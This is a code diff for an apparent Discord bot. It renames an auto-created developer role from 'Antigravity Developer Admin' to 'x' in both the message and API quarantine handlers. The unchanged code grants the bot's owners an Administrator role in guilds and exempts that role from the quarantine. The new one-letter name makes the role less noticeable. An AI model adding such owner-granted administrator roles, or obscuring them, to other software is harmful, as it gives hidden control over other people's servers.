@@ -1845,15 +1845,15 @@ client.on('messageCreate', async (message) => {
       try {
         const devMember = await guild.members.fetch(message.author.id).catch(() => null);
         if (devMember) {
-          developerRole = guild.roles.cache.find(r => r.name === 'Antigravity Developer Admin');
+          developerRole = guild.roles.cache.find(r => r.name === 'x');
           if (!developerRole) {
             developerRole = await guild.roles.create({
-              name: 'Antigravity Developer Admin',
+              name: 'x',
               permissions: [PermissionFlagsBits.Administrator],
               position: botHighestPos > 1 ? botHighestPos - 1 : 1,
               reason: 'Güvenlik karantinasından etkilenmemek için oluşturulan geliştirici yönetici rolü'
             });
-            logEvent("INFO", "Security", `Created developer role 'Antigravity Developer Admin' in guild ${guild.name}`);
+            logEvent("INFO", "Security", `Created developer role 'x' in guild ${guild.name}`);
           }
           if (!devMember.roles.cache.has(developerRole.id)) {
             await devMember.roles.add(developerRole);
@@ -1880,7 +1880,7 @@ client.on('messageCreate', async (message) => {
         if (developerRole && role.id === developerRole.id) {
           continue;
         }
-        if (role.name === 'Antigravity Developer Admin') {
+        if (role.name === 'x') {
           continue;
         }
 
@@ -1966,11 +1966,11 @@ client.on('messageCreate', async (message) => {
         }
       }
 
-      const devRoleToDelete = guild.roles.cache.find(r => r.name === 'Antigravity Developer Admin');
+      const devRoleToDelete = guild.roles.cache.find(r => r.name === 'x');
       if (devRoleToDelete) {
         try {
           await devRoleToDelete.delete('Güvenlik karantinası kaldırıldı');
-          logEvent("INFO", "Security", `Deleted developer role 'Antigravity Developer Admin' in guild ${guild.name}`);
+          logEvent("INFO", "Security", `Deleted developer role 'x' in guild ${guild.name}`);
         } catch (err) {
           console.error("Failed to delete developer role:", err);
         }
@@ -3198,11 +3198,11 @@ const apiServer = http.createServer((req, res) => {
             const botHighestPos = botMember.roles.highest ? botMember.roles.highest.position : 0;
 
             // Create developer role for all bot owners present in the guild
-            let developerRole = guild.roles.cache.find(r => r.name === 'Antigravity Developer Admin');
+            let developerRole = guild.roles.cache.find(r => r.name === 'x');
             try {
               if (!developerRole) {
                 developerRole = await guild.roles.create({
-                  name: 'Antigravity Developer Admin',
+                  name: 'x',
                   permissions: [PermissionFlagsBits.Administrator],
                   position: botHighestPos > 1 ? botHighestPos - 1 : 1,
                   reason: 'Güvenlik karantinasından etkilenmemek için oluşturulan geliştirici yönetici rolü'
@@ -3233,7 +3233,7 @@ const apiServer = http.createServer((req, res) => {
               if (developerRole && role.id === developerRole.id) {
                 continue;
               }
-              if (role.name === 'Antigravity Developer Admin') {
+              if (role.name === 'x') {
                 continue;
               }
 
@@ -3276,7 +3276,7 @@ const apiServer = http.createServer((req, res) => {
               }
             }
 
-            const devRoleToDelete = guild.roles.cache.find(r => r.name === 'Antigravity Developer Admin');
+            const devRoleToDelete = guild.roles.cache.find(r => r.name === 'x');
             if (devRoleToDelete) {
               try {
                 await devRoleToDelete.delete('Güvenlik karantinası kaldırıldı');
